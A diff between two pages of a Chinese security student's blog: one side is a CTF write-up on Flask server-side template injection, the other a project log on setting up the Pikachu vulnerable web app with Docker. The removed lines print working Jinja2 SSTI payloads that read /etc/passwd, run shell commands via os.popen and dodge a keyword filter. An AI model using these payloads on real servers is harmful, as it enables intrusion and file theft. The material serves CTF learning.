@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      python-flask(ssti) | 晓不是小
+      大学生创新科研项目结项记录 | 晓不是小
     
   </title>
   <meta name="author" content="Jonathan">
@@ -101,7 +101,7 @@
 	<!-- Page title -->
 	<p>
 		
-			「python-flask(ssti)」
+			「大学生创新科研项目结项记录」
 		
 	</p>
 
@@ -247,8 +247,8 @@
 	<div id="layout-post">
 		<div class="article-title">
 			
-	<a href="/2020/02/29/python-flask-ssti/" itemprop="url">
-		python-flask(ssti)
+	<a href="/2020/06/17/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%88%9B%E6%96%B0%E7%A7%91%E7%A0%94%E9%A1%B9%E7%9B%AE%E7%BB%93%E9%A1%B9%E8%AE%B0%E5%BD%95/" itemprop="url">
+		大学生创新科研项目结项记录
 	</a>
 
 		</div>
@@ -264,9 +264,9 @@
 
 	更新于
 
-	<a href="/2020/02/29/python-flask-ssti/" itemprop="url">
-		<time datetime="2020-02-29T12:45:56.000Z" itemprop="dateUpdated">
-	  		2020-03-01
+	<a href="/2020/06/17/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%88%9B%E6%96%B0%E7%A7%91%E7%A0%94%E9%A1%B9%E7%9B%AE%E7%BB%93%E9%A1%B9%E8%AE%B0%E5%BD%95/" itemprop="url">
+		<time datetime="2020-06-17T07:19:10.000Z" itemprop="dateUpdated">
+	  		2020-07-07
 	  </time>
 	</a> 
 
@@ -277,16 +277,8 @@
 				
 	<i class="icon-price-tags"></i>
 	
-		<a href="/tags/ctf/" class=" ">
-			ctf
-		</a>
-	
-		<a href="/tags/python/" class=" ">
-			python
-		</a>
-	
-		<a href="/tags/flask/" class=" ">
-			flask
+		<a href="/tags/%E8%AE%B0%E5%BD%95/" class=" ">
+			记录
 		</a>
 	
 		
@@ -299,49 +291,34 @@
 		</div>
 
 		<div class="article-content" id="article-content">
-			<h1></h1>
----
----
+			<p>2020.6月</p>
+<p>项目是搭建网络安全学习平台，年后尝试搭建了各种平台，主要还是基于ctf的比赛平台，在尝试搭建H1ve美化过的ctfd时一直失败，便停了一段时间。</p>
+<pre><code>https://github.com/D0g3-Lab/H1ve</code></pre><p>期间也尝试用闲置的服务器搭建个人博客，不过最后选在GitHub上单间了现在的博客，很大程度因为喜欢现在的博客主题吧。</p>
+<p>现在一晃从3月到了6月，觉得项目得有些进度了，之前的许多尝试得有些成果，基于之前尝试时，在云服务器上搭建比赛平台，只要失败报错，很可能就要重置系统或者恢复快照，所以这次准备稳扎稳打，总结之前的经验教训，每搭建一部分就做好快照，如果觉得这部分成熟了，再删掉。</p>
+<p>根据项目内容主要分为两部分，第一部分是网络安全的入门学习平台，准备搭建<strong>docker-pikachu</strong>作为学习平台，后期也以ctfd作为进阶的练习平台和校内比赛平台，第二部分是有关内网的，这部分不在此记录。</p>
+<hr>
+<h2 id="简介"><a href="#简介" class="headerlink" title="** 简介**"></a>** 简介**</h2><blockquote>
+<p>Pikachu是一个带有漏洞的Web应用系统，基本包含了常见的web安全漏洞。</p>
+</blockquote>
+<h2 id="下载pikachu文件地址如下"><a href="#下载pikachu文件地址如下" class="headerlink" title="下载pikachu文件地址如下"></a><strong>下载pikachu</strong>文件地址如下</h2><pre><code>git clone https://github.com/zhuifengshaonianhanlu/pikachu</code></pre><h2 id="利用docker把pikachu搭建起来步骤如下"><a href="#利用docker把pikachu搭建起来步骤如下" class="headerlink" title="利用docker把pikachu搭建起来步骤如下"></a><strong>利用docker把pikachu搭建起来步骤如下</strong></h2><pre><code>使用 Dockerfile 创建镜像
 
-<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h2 id="2020新春公益ctf"><a href="#2020新春公益ctf" class="headerlink" title="2020新春公益ctf"></a>2020新春公益ctf</h2><p>&emsp;FlaskApp：</p>
-<p>考察点：<a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener" title="Flask debug pin安全问题">https://xz.aliyun.com/t/2553</a></p>
-<p>探测：</p>
-<p>在decode界面可以触发SSTI，提交payload的base64编码即可，base64的编码要在加密端完成。<br>测出题目用的是python3.7环境，可以在本地Fuzz下能用的类。<br>官方给出的面payload可以任意文件读取</p>
-<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %}</code></pre><p>脚本获取pin码后读取文件：</p>
-<pre><code>import os
-&gt;&gt;&gt; os.popen(&apos;ls /&apos;)
-&lt;os._wrap_close object at 0x7f53ed8a6650&gt;
-&gt;&gt;&gt; 
-&gt;&gt;&gt; os.popen(&apos;ls /&apos;).read()
-&apos;app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nro  
-&gt;&gt;&gt; print(os.popen(&apos;ls /&apos;).read())
-app
-bin
-boot
-dev
-etc
-home
-lib
-lib64
-media
-mnt
-opt
-proc
-root
-run
-sbin
-srv
-sys
-this_is_the_flag.txt
-tmp
-usr
-var
+    docker build -t pikachu .</code></pre><p>使用当前目录kerfile 创建镜像，命为 pikachu。（要和Dockerfile在同一目录，注意命令后面还有一个点）</p>
+<pre><code>`docker images`</code></pre><p><img src="https://zalcat.oss-cn-hangzhou.aliyuncs.com/blog/20200617165228.png" alt=""></p>
+<h2 id="启动容器pikachu"><a href="#启动容器pikachu" class="headerlink" title="** 启动容器pikachu**"></a>** 启动容器pikachu**</h2><pre><code>docker run -it -d -p 7071:80 c877d42ce288</code></pre><p>根据以往的经验教训这里一般不用8082，我换成了7071.</p>
+<p>注意服务器相应的端口防火墙要打开。就可以访问了。</p>
+<p><strong>此时要做的时配置数据库信息，因为使用docker搭建的所以要进容器里面去改，并且xss有一个后台也要配置文件连接数据库</strong></p>
+<h2 id="进入容器修改配置文件连接mysql数据库"><a href="#进入容器修改配置文件连接mysql数据库" class="headerlink" title="进入容器修改配置文件连接mysql数据库"></a><strong>进入容器修改配置文件连接mysql数据库</strong></h2><pre><code>`docker exec -it fe5e1a289bcc /bin/bash`
 
-&gt;&gt;&gt; print(os.popen(&apos;cat /this_is_the_flag.txt&apos;).read())
-flag{c397e891-0fca-4938-b307-d1bee4344350}</code></pre><p>BUUctf中对waf进行过加固；实际题目中</p>
-<pre><code>{{ [].__class__.__base__.__subclasses__()[127].__init__.__globals__['po'+'pen']('ls').read()}}
-
-{{ [].__class__.__base__.__subclasses__()[127].__init__.__globals__['po'+'pen']('cat  this_is_the_fla\g.txt').read()}}</code></pre><p>是模板注入而不是RCE。</p>
+cd app/inc/ &amp;&amp; vim config.inc.php</code></pre><h2 id="修改后重启容器"><a href="#修改后重启容器" class="headerlink" title="修改后重启容器"></a><strong>修改后重启容器</strong></h2><pre><code>`docker restart fe5e1a289bc`</code></pre><ul>
+<li><p>Pikachu有一个xss后台，也需要配置文件连接数据库步骤都一样</p>
+<p>  <code>cd app/pkxss/inc &amp;&amp; vim config.inc.php</code></p>
+</li>
+</ul>
+<p><img src="https://zalcat.oss-cn-hangzhou.aliyuncs.com/blog/20200617171153.png" alt=""></p>
+<hr>
+<p>因为要用到数据库mysql，我用小皮面板来安装MySQL</p>
+<p><code>wget -O install.sh https://download.xp.cn/install.sh &amp;&amp; sudo bash install.sh</code></p>
+<h2 id="生成镜像方便使用"><a href="#生成镜像方便使用" class="headerlink" title="生成镜像方便使用"></a>生成镜像方便使用</h2><p>我在安装前对pikaqu的前端进行了一点修改，并且我希望这个配置的皮卡丘能更方便使用，所以在最后将其push到阿里云镜像仓库了</p>
 	
 		</div>
 		
@@ -360,12 +337,8 @@ flag{c397e891-0fca-4938-b307-d1bee4344350}</code></pre><p>BUUctf中对waf进行�
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
-			<a href="/2020/03/02/ctfhub/" title="ctfhub" rel="prev">
-				&laquo;上一篇
-			</a>
 		
-		
-			<a href="/2020/02/27/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/" title="博客搭建记录" rel="next">
+			<a href="/2020/06/13/1/" title="1" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -383,6 +356,63 @@ flag{c397e891-0fca-4938-b307-d1bee4344350}</code></pre><p>BUUctf中对waf进行�
 <div class="relate-post">
 	
 		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2020/03/02/ctfhub/" title="ctfhub">
+								ctfhub			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 2日, 2020				
+							</p>
+							<p class="relate-post-content">
+								
+
+CTFHub专注信息安全竞赛，拥有完善的题目环境及配套Writeup。清晰的学习路线可以快速帮助新手成长，降低CTF准入门槛。经典的题目再现，帮助选手磨练技艺。紧跟主流比赛潮流，实时同步赛事信息，不漏过任何一个关键比赛。
+
+小记：...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2020/03/02/ctfhub/" title="ctfhub">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="ctfhub"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2020/02/27/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/" title="博客搭建记录">
+								博客搭建记录			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								二月 27日, 2020				
+							</p>
+							<p class="relate-post-content">
+								
+
+
+&emsp;起因我在csdn写了博客1年多了，翻找自己以前的文章发现几个问题
+
+内容杂乱不成体系
+深度不够
+长篇幅文章不合适
+
+简单来说，自己想提升一点，用新的博客重新开始记录，csdn当然还会用，只是考虑到自己要记录一些内网相...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2020/02/27/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/" title="博客搭建记录">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="博客搭建记录"/>
+							</a>
+						</div>
+					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -438,81 +468,29 @@ flag{c397e891-0fca-4938-b307-d1bee4344350}</code></pre><p>BUUctf中对waf进行�
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2020/03/02/ctfhub/" title="ctfhub">
-								ctfhub			
+							<a class="relate-post-title" href="/2020/02/29/python-flask-ssti/" title="python-flask(ssti)">
+								python-flask(ssti)			
 							</a>
 							<p class="relate-post-date">
 								<i class="fa fa-calendar"></i>
-								三月 2日, 2020				
+								二月 29日, 2020				
 							</p>
 							<p class="relate-post-content">
 								
+---
+---
 
-CTFHub专注信息安全竞赛，拥有完善的题目环境及配套Writeup。清晰的学习路线可以快速帮助新手成长，降低CTF准入门槛。经典的题目再现，帮助选手磨练技艺。紧跟主流比赛潮流，实时同步赛事信息，不漏过任何一个关键比赛。
-
-小记：...
+0x012020新春公益ctf&emsp;FlaskApp：
+考察点：https://xz.aliyun.com/t/2553
+探测：
+在decode界面可以触发SSTI，提交payload的base64编码即可，...
 							</p>
 						</div>
 
 						<div class="relate-post-cover">
-							<a href="/2020/03/02/ctfhub/" title="ctfhub">				
+							<a href="/2020/02/29/python-flask-ssti/" title="python-flask(ssti)">				
 								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="ctfhub"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2020/06/17/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%88%9B%E6%96%B0%E7%A7%91%E7%A0%94%E9%A1%B9%E7%9B%AE%E7%BB%93%E9%A1%B9%E8%AE%B0%E5%BD%95/" title="大学生创新科研项目结项记录">
-								大学生创新科研项目结项记录			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								六月 17日, 2020				
-							</p>
-							<p class="relate-post-content">
-								2020.6月
-项目是搭建网络安全学习平台，年后尝试搭建了各种平台，主要还是基于ctf的比赛平台，在尝试搭建H1ve美化过的ctfd时一直失败，便停了一段时间。
-https://github.com/D0g3-Lab/H1ve期间也尝...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2020/06/17/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%88%9B%E6%96%B0%E7%A7%91%E7%A0%94%E9%A1%B9%E7%9B%AE%E7%BB%93%E9%A1%B9%E8%AE%B0%E5%BD%95/" title="大学生创新科研项目结项记录">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="大学生创新科研项目结项记录"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2020/02/27/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/" title="博客搭建记录">
-								博客搭建记录			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								二月 27日, 2020				
-							</p>
-							<p class="relate-post-content">
-								
-
-
-&emsp;起因我在csdn写了博客1年多了，翻找自己以前的文章发现几个问题
-
-内容杂乱不成体系
-深度不够
-长篇幅文章不合适
-
-简单来说，自己想提升一点，用新的博客重新开始记录，csdn当然还会用，只是考虑到自己要记录一些内网相...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2020/02/27/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/" title="博客搭建记录">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="博客搭建记录"/>
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="python-flask(ssti)"/>
 							</a>
 						</div>
 					</li>												
